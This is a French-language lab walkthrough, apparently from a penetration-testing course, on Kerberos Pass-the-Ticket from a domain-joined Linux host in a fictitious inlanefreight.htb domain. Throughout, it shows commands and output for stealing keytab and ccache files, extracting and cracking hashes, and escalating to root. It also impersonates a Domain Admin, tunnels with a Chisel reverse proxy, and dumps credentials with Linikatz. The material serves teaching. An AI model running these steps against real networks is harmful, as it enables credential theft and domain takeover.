# Passez le ticket (PtT) à partir de Linux

Bien que cela ne soit pas courant, les ordinateurs Linux peuvent se connecter à Active Directory pour fournir une gestion centralisée des identités et s'intégrer aux systèmes de l'organisation, donnant aux utilisateurs la possibilité d'avoir une seule identité pour s'authentifier sur les ordinateurs Linux et Windows.

Un ordinateur Linux connecté à Active Directory utilise couramment Kerberos comme authentification. Supposons que ce soit le cas et que nous parvenions à compromettre une machine Linux connectée à Active Directory. Dans ce cas, nous pourrions essayer de trouver des tickets Kerberos pour se faire passer pour d'autres utilisateurs et obtenir plus d'accès au réseau.

Un système Linux peut être configuré de différentes manières pour stocker les tickets Kerberos. Nous aborderons quelques options de stockage différentes dans cette section.

## Kerberos sous Linux
Windows et Linux utilisent le même processus pour demander un Ticket Granting Ticket (TGT) et un Service Ticket (TGS). Cependant, la manière dont ils stockent les informations de ticket peut varier en fonction de la distribution et de l'implémentation Linux.

Dans la plupart des cas, les machines Linux stockent les tickets Kerberos sous forme de fichiers ccache dans le répertoire /tmp. Par défaut, l'emplacement du ticket Kerberos est stocké dans la variable d'environnement KRB5CCNAME. Cette variable peut identifier si des tickets Kerberos sont utilisés ou si l'emplacement par défaut de stockage des tickets Kerberos est modifié. Ces fichiers ccache sont protégés par des autorisations de lecture et d'écriture, mais un utilisateur disposant de privilèges élevés ou de privilèges root pourrait facilement accéder à ces tickets.

Une autre utilisation quotidienne de Kerberos sous Linux concerne les fichiers keytab. Un keytab est un fichier contenant des paires de principaux Kerberos et de clés chiffrées (qui sont dérivées du mot de passe Kerberos). Vous pouvez utiliser un fichier keytab pour vous authentifier auprès de divers systèmes distants à l'aide de Kerberos sans saisir de mot de passe. Cependant, lorsque vous modifiez votre mot de passe, vous devez recréer tous vos fichiers keytab.

Les fichiers Keytab permettent généralement aux scripts de s'authentifier automatiquement à l'aide de Kerberos sans nécessiter d'interaction humaine ni d'accès à un mot de passe stocké dans un fichier texte brut. Par exemple, un script peut utiliser un fichier keytab pour accéder aux fichiers stockés dans le dossier de partage Windows.

## Scénario
Pour pratiquer et comprendre comment nous pouvons abuser de Kerberos à partir d'un système Linux, nous avons un ordinateur (LINUX01) connecté au contrôleur de domaine. Cette machine n'est accessible que via MS01. Pour accéder à cette machine via SSH, nous pouvons nous connecter à MS01 via RDP et, à partir de là, nous connecter à la machine Linux en utilisant SSH à partir de la ligne de commande Windows. Une autre option consiste à utiliser une redirection de port. Si vous ne savez pas comment faire, vous pouvez lire le module Pivoting, Tunneling, and Port Forwarding.

### Linux Auth from MS01 Image
![linux-auth-from-ms01.jpeg](ressource/linux-auth-from-ms01.jpeg)

Comme alternative, nous avons créé une redirection de port pour simplifier l'interaction avec LINUX01. En se connectant au port TCP/2222 sur MS01, nous aurons accès au port TCP/22 sur LINUX01.

Supposons que nous soyons dans une nouvelle évaluation et que la société nous donne accès à LINUX01 et à l'utilisateur david@inlanefreight.htb et au mot de passe Password2.

### Linux Auth via Port Forward
```
dsgsec@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222

david@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 11 Oct 2022 09:30:58 AM UTC

  System load:  0.09               Processes:               227
  Usage of /:   38.1% of 13.70GB   Users logged in:         2
  Memory usage: 32%                IPv4 address for ens160: 172.16.1.15
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

12 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

New release '22.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Tue Oct 11 09:30:46 2022 from 172.16.1.5
david@inlanefreight.htb@linux01:~$ 
```

## Identification de l'intégration Linux et Active Directory
Nous pouvons identifier si la machine Linux est une jointure de domaine à l'aide de realm, un outil utilisé pour gérer l'inscription du système dans un domaine et définir quels utilisateurs ou groupes de domaine sont autorisés à accéder aux ressources système locales.

### realm - Vérifier si la machine Linux est jointe au domaine
```
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

La sortie de la commande indique que la machine est configurée en tant que membre Kerberos. Il nous donne également des informations sur le nom de domaine (inlanefreight.htb) et quels utilisateurs et groupes sont autorisés à se connecter, qui dans ce cas sont les utilisateurs David et Julio et le groupe Linux Admins.

Si le domaine n'est pas disponible, nous pouvons également rechercher d'autres outils utilisés pour intégrer Linux à Active Directory, tels que sssd ou winbind. La recherche de ces services en cours d'exécution sur la machine est un autre moyen d'identifier s'il s'agit d'un domaine joint. Nous pouvons lire cet article de blog pour plus de détails. Recherchons ces services pour confirmer si la machine est jointe au domaine.

### PS - Vérifiez si la machine Linux est jointe au domaine
```
avid@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
```

## Recherche de tickets Kerberos sous Linux
En tant qu'attaquant, nous recherchons toujours des informations d'identification. Sur les machines jointes au domaine Linux, nous voulons trouver des tickets Kerberos pour obtenir plus d'accès. Les tickets Kerberos peuvent être trouvés à différents endroits en fonction de l'implémentation Linux ou de la modification des paramètres par défaut par l'administrateur. Explorons quelques méthodes courantes pour trouver des tickets Kerberos.

## Recherche de fichiers Keytab
Une approche simple consiste à utiliser find pour rechercher des fichiers dont le nom contient le mot keytab. Lorsqu'un administrateur crée généralement un ticket Kerberos à utiliser avec un script, il définit l'extension sur .keytab. Bien que non obligatoire, il s'agit d'un moyen par lequel les administrateurs se réfèrent généralement à un fichier keytab.

### Utilisation de la recherche pour rechercher des fichiers avec Keytab dans le nom
```
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

<SNIP>

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

Une autre façon de trouver des fichiers keytab consiste à utiliser des scripts automatisés configurés à l'aide d'un cronjob ou de tout autre service Linux. Si un administrateur doit exécuter un script pour interagir avec un service Windows qui utilise Kerberos, et si le fichier keytab n'a pas l'extension .keytab, nous pouvons trouver le nom de fichier approprié dans le script. Voyons cet exemple :

### Identification des fichiers Keytab dans les tâches cron
```
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
<SNIP>
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

Dans le script ci-dessus, nous remarquons l'utilisation de kinit, ce qui signifie que Kerberos est utilisé. kinit permet d'interagir avec Kerberos, et sa fonction est de demander le TGT de l'utilisateur et de stocker ce ticket dans le cache (fichier ccache). Nous pouvons utiliser kinit pour importer un keytab dans notre session et agir en tant qu'utilisateur.

Dans cet exemple, nous avons trouvé un script important un ticket Kerberos (svc_workstations.kt) pour l'utilisateur svc_workstations@INLANEFREIGHT.HTB avant d'essayer de se connecter à un dossier partagé. Nous verrons plus tard comment utiliser ces tickets et usurper l'identité des utilisateurs.

## Recherche de fichiers ccache
Un cache d'informations d'identification ou un fichier ccache contient les informations d'identification Kerberos tant qu'elles restent valides et, généralement, pendant la durée de la session de l'utilisateur. Une fois qu'un utilisateur s'est authentifié auprès du domaine, un fichier ccache est créé pour stocker les informations du ticket. Le chemin d'accès à ce fichier est placé dans la variable d'environnement KRB5CCNAME. Cette variable est utilisée par les outils prenant en charge l'authentification Kerberos pour rechercher les données Kerberos. Cherchons les variables d'environnement et identifions l'emplacement de notre cache d'informations d'identification Kerberos :

### Examen des variables d'environnement pour les fichiers ccache.
```
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

Comme mentionné précédemment, les fichiers ccache sont situés, par défaut, dans /tmp. Nous pouvons rechercher des utilisateurs qui sont connectés à l'ordinateur, et si nous obtenons un accès en tant que root ou utilisateur privilégié, nous pourrions usurper l'identité d'un utilisateur en utilisant son fichier ccache pendant qu'il est encore valide.

### Recherche de fichiers ccache dans /tmp
```
david@inlanefreight.htb@linux01:~$ ls -la /tmp

total 68
drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

## Abus de fichiers KeyTab
En tant qu'attaquants, nous pouvons avoir plusieurs utilisations pour un fichier keytab. La première chose que nous pouvons faire est de se faire passer pour un utilisateur en utilisant kinit. Pour utiliser un fichier keytab, nous devons savoir pour quel utilisateur il a été créé. klist est une autre application utilisée pour interagir avec Kerberos sous Linux. Cette application lit les informations d'un fichier keytab. Voyons cela avec la commande suivante :

### Liste des informations sur le fichier keytab
```
david@inlanefreight.htb@linux01:~$ klist -k -t 

/opt/specialfiles/carlos.keytab 
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

Le ticket correspond à l'utilisateur Carlos. Nous pouvons maintenant emprunter l'identité de l'utilisateur avec kinit. Confirmons quel ticket nous utilisons avec klist puis importons le ticket de Carlos dans notre session avec kinit.


### Usurper l'identité d'un utilisateur avec un keytab
```
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```
Nous pouvons tenter d'accéder au dossier partagé \\dc01\carlos pour confirmer notre accès.

### Se connecter au partage smb avec Carlos
```
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

                7706623 blocks of size 4096. 4452852 blocks available
```

```
Remarque : Pour conserver le ticket de la session en cours, avant d'importer le keytab, enregistrez une copie du fichier ccache présent dans la variable d'environnement KRB5CCNAME.
```

## Extrait de tableau de clés
La deuxième méthode que nous utiliserons pour abuser de Kerberos sous Linux consiste à extraire les secrets d'un fichier keytab. Nous avons pu usurper l'identité de Carlos en utilisant les tickets du compte pour lire un dossier partagé dans le domaine, mais si nous voulons accéder à son compte sur la machine Linux, nous aurons besoin de son mot de passe.

Nous pouvons tenter de déchiffrer le mot de passe du compte en extrayant les hachages du fichier keytab. Utilisons KeyTabExtract, un outil pour extraire des informations précieuses à partir de fichiers .keytab de type 502, qui peuvent être utilisés pour authentifier les machines Linux auprès de Kerberos. Le script extraira des informations telles que le domaine, le principal du service, le type de chiffrement et les hachages.

### Extraction des hachages Keytab avec KeyTabExtract
```
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

Avec le hachage NTLM, nous pouvons effectuer une attaque Pass the Hash. Avec le hachage AES256 ou AES128, nous pouvons falsifier nos tickets en utilisant Rubeus ou tenter de déchiffrer les hachages pour obtenir le mot de passe en clair.

Le hachage le plus simple à casser est le hachage NTLM. Nous pouvons utiliser des outils comme Hashcat ou John the Ripper pour le casser. Cependant, un moyen rapide de déchiffrer les mots de passe consiste à utiliser des référentiels en ligne tels que https://crackstation.net/, qui contient des milliards de mots de passe.

![craclstation](ressource/crackstation.jpeg)

Comme nous pouvons le voir sur l'image, le mot de passe de l'utilisateur Carlos est Password5. Nous pouvons maintenant nous connecter en tant que Carlos.

### Connectez-vous en tant que Carlos
```
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb

Password: 
carlos@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:01:13
```

### Obtenir plus de hachages
Carlos a une tâche cron qui utilise un fichier keytab nommé svc_workstations.kt. Nous pouvons répéter le processus, déchiffrer le mot de passe et nous connecter en tant que svc_workstations.

## Abus du cache Keytab
Pour abuser d'un fichier ccache, tout ce dont nous avons besoin est de privilèges de lecture sur le fichier. Ces fichiers, situés dans /tmp, ne peuvent être lus que par l'utilisateur qui les a créés, mais si nous obtenons un accès root, nous pourrions les utiliser.

Une fois que nous nous sommes connectés avec les informations d'identification de l'utilisateur svc_workstations, nous pouvons utiliser sudo -l et confirmer que l'utilisateur peut exécuter n'importe quelle commande en tant que root. Nous pouvons utiliser la commande sudo su pour changer l'utilisateur en root.@

### Privilege Escalation to Root
```
dsgsec@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
                  
svc_workstations@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)          
...SNIP...

svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
svc_workstations@inlanefreight.htb@linux01:~$ sudo su
root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
root
```

En tant que root, nous devons identifier quels tickets sont présents sur la machine, à qui ils appartiennent et leur date d'expiration.

### Looking for ccache Files
```
root@linux01:~# ls -la /tmp

total 76
drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Oct  7 11:35 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
```

Il y a un utilisateur (julio@inlanefreight.htb) auquel nous n'avons pas encore accès. Nous pouvons confirmer les groupes auxquels il appartient en utilisant id.

## Identifying Group ZMembership with the id Command
```
root@linux01:~# id julio@inlanefreight.htb

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

Julio est membre du groupe Admins du domaine. Nous pouvons tenter d'usurper l'identité de l'utilisateur et accéder à l'hôte du contrôleur de domaine DC01.

Pour utiliser un fichier ccache, nous pouvons copier le fichier ccache et attribuer le chemin du fichier à la variable KRB5CCNAME.

### Importation du fichier ccache dans notre session en cours
```
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2022
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Wed Oct  5 13:20:00 2022

                7706623 blocks of size 4096. 4447612 blocks available
```

<hr>

## Utilisation des outils d'attaque Linux avec Kerberos

La plupart des outils d'attaque Linux qui interagissent avec Windows et Active Directory prennent en charge l'authentification Kerberos. Si nous les utilisons à partir d'une machine jointe à un domaine, nous devons nous assurer que notre variable d'environnement KRB5CCNAME est définie sur le fichier ccache que nous voulons utiliser. Dans le cas où nous attaquons depuis une machine qui n'est pas membre du domaine, par exemple, notre hôte d'attaque, nous devons nous assurer que notre machine peut contacter le KDC ou le contrôleur de domaine, et que la résolution du nom de domaine fonctionne.

Dans ce scénario, notre hôte d'attaque n'a pas de connexion au KDC/contrôleur de domaine, et nous ne pouvons pas utiliser le contrôleur de domaine pour la résolution de noms. Pour utiliser Kerberos, nous devons proxy notre trafic via MS01 avec un outil tel que Chisel et Proxychains et modifier le fichier /etc/hosts pour coder en dur les adresses IP du domaine et les machines que nous voulons attaquer.

### Modification du fichier hosts
```
dsgsec@htb[/htb]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

Nous devons modifier notre fichier de configuration proxychains pour utiliser socks5 et le port 1080.

```
dsgsec@htb[/htb]$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

Nous devons télécharger et exécuter chisel sur notre hôte d'attaque.

### Téléchargez Chisel sur notre hôte d'attaque
```
dsgsec@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
dsgsec@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
dsgsec@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
dsgsec@htb[/htb]$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

Connectez-vous à MS01 via RDP et exécutez le ciseau (situé dans C:\Tools).

### Connectez-vous à MS01 avec xfreerdp
```
dsgsec@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

### Execute chisel from MS01
```
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```
Enfin, nous devons transférer le fichier ccache de Julio depuis LINUX01 et créer la variable d'environnement KRB5CCNAME avec la valeur correspondant au chemin du fichier ccache.

## Définition de la variable d'environnement KRB5CCNAME
```
dsgsec@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

### Impaquet
Pour utiliser le ticket Kerberos, nous devons spécifier le nom de notre machine cible (pas l'adresse IP) et utiliser l'option -k. Si nous recevons une invite pour un mot de passe, nous pouvons également inclure l'option -no-pass.

### Utilisation d'Impacket avec des chaînes proxy et l'authentification Kerberos
```
dsgsec@htb[/htb]$ proxychains impacket-wmiexec ms01 -k

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  ms01:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  ms01:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  MS01:50713  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\julio

```

### Evil-Winrm
Pour utiliser evil-winrm avec Kerberos, nous devons installer le package Kerberos utilisé pour l'authentification réseau. Pour certains Linux comme Debian (Parrot, Kali, etc.), il s'appelle krb5-user. Lors de l'installation, nous recevrons une invite pour le domaine Kerberos. Utilisez le nom de domaine : INLANEFREIGHT.HTB, et le KDC est le DC01.

### Installation du package d'authentification Kerberos
```
dsgsec@htb[/htb]$ sudo apt-get install krb5-user -y

Reading package lists... Done                                                                                                  
Building dependency tree... Done    
Reading state information... Done

<SNIP>
```

### Default Kerberos Version 5 realm
![realm](ressource/kerberos-realm.jpeg)

### Serveur administratif pour votre domaine Kerberos
![realm](ressource/kerberos-server-dc01.jpeg)

Si le package krb5-user est déjà installé, nous devons modifier le fichier de configuration /etc/krb5.conf pour inclure les valeurs suivantes :

### Fichier de configuration Kerberos pour INLANEFREIGHT.HTB
```
dsgsec@htb[/htb]$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```

Maintenant, nous pouvons utiliser evil-winrm.

### Utiliser Evil-WinRM avec Kerberos
```
dsgsec@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

Evil-WinRM shell v3.3

Warning: Remote path completions are disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
inlanefreight\julio
DC01
```

## Divers
Si nous voulons utiliser un fichier ccache sous Windows ou un fichier kirbi sur une machine Linux, nous pouvons utiliser impacket-ticketConverter pour les convertir. Pour l'utiliser, nous spécifions le fichier que nous voulons convertir et le nom du fichier de sortie. Convertissons le fichier ccache de Julio en kirbi.
```
dsgsec@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```

Nous pouvons faire l'opération inverse en sélectionnant d'abord un fichier .kirbi. Utilisons le fichier .kirbi dans Windows.

### mportation d'un ticket converti dans une session Windows avec Rubeus
```
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
C:\htb> klist

Current LogonId is 0:0x31adf02

Cached Tickets: (1)

#0>     Client: julio @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
        Start Time: 10/10/2022 5:46:02 (local)
        End Time:   10/10/2022 15:46:02 (local)
        Renew Time: 10/11/2022 5:46:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

C:\htb>dir \\dc01\julio
 Volume in drive \\dc01\julio has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\dc01\julio

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  04:18 PM                17 julio.txt
               1 File(s)             17 bytes
               2 Dir(s)  18,161,782,784 bytes free
```

## Linikatz
Linikatz est un outil créé par l'équipe de sécurité de Cisco pour exploiter les informations d'identification sur les machines Linux lorsqu'il y a une intégration avec Active Directory. En d'autres termes, Linikatz apporte un principe similaire à Mimikatz aux environnements UNIX.

Tout comme Mimikatz, pour profiter de Linikatz, nous devons être root sur la machine. Cet outil extraira toutes les informations d'identification, y compris les tickets Kerberos, de différentes implémentations Kerberos telles que FreeIPA, SSSD, Samba, Vintella, etc. Une fois qu'il aura extrait les informations d'identification, il les placera dans un dossier dont le nom commence par linikatz.. Dans ce dossier, vous trouverez les informations d'identification dans les différents formats disponibles, y compris ccache et keytabs. Ceux-ci peuvent être utilisés, le cas échéant, comme expliqué ci-dessus.

### Téléchargement et exécution de Linikatz
```
dsgsec@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
dsgsec@htb[/htb]$ /opt/linikatz.sh
 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   < (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=

I: [freeipa-check] FreeIPA AD configuration
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
I: [sss-check] SSS AD configuration
